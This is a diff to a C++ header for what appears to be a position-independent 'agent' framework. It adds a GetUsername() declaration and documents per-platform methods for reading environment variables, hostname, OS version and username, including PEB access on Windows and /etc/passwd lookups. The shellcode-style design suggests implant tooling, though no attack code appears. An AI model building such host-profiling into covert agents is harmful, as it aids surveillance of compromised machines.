@@ -4,15 +4,16 @@
  *
  * @details Provides position-independent access to environment variables and
  * platform identification across all supported targets. On Windows, variables
- * are read from the PEB environment block. On Linux, macOS, and Solaris,
- * variables are retrieved from the process environ pointer. On UEFI,
- * GetVariable() always returns 0 as environment variables are not available.
- * No .rdata dependencies.
+ * are read from the PEB environment block. On Linux/Android, variables are read
+ * from /proc/self/environ. On macOS/iOS/FreeBSD/Solaris the environment layer
+ * is unavailable (GetVariable() returns 0). On UEFI, GetVariable() always
+ * returns 0 as environment variables are not available. No .rdata dependencies.
  *
  * Platform and system identification:
  * - GetAgentPlatform(): compile-time OS target string (e.g. "windows", "linux")
  * - GetOSVersion(): runtime OS version string (e.g. "Windows 10.0 Build 19045")
  * - GetHostname(): machine hostname from OS environment
+ * - GetUsername(): current user name (env, getuid()+/etc/passwd, or numeric uid)
  * - GetArchitecture(): compile-time CPU architecture string (e.g. "x86_64")
  */
 
@@ -84,6 +85,21 @@ public:
 	 * @return Ok(length) on success, Err on failure
 	 */
 	[[nodiscard]] static Result<USIZE, Error> GetHostname(Span<CHAR> buffer) noexcept;
+
+	/**
+	 * @brief Retrieves the current user name.
+	 *
+	 * @param buffer Output buffer to receive the username string.
+	 * @return Ok(length) on success, Err on failure.
+	 *
+	 * @details Retrieves the username using platform-specific methods:
+	 * - Windows: USERNAME environment variable from PEB
+	 * - Linux/Android: USER/LOGNAME environment variable
+	 * - macOS/iOS/FreeBSD/Solaris: getuid() syscall + /etc/passwd lookup
+	 *   (the environment layer is unavailable here)
+	 * - UEFI: returns Err (no user concept)
+	 */
+	[[nodiscard]] static Result<USIZE, Error> GetUsername(Span<CHAR> buffer) noexcept;
 
 	/**
 	 * @brief Retrieves the compile-time CPU architecture string.
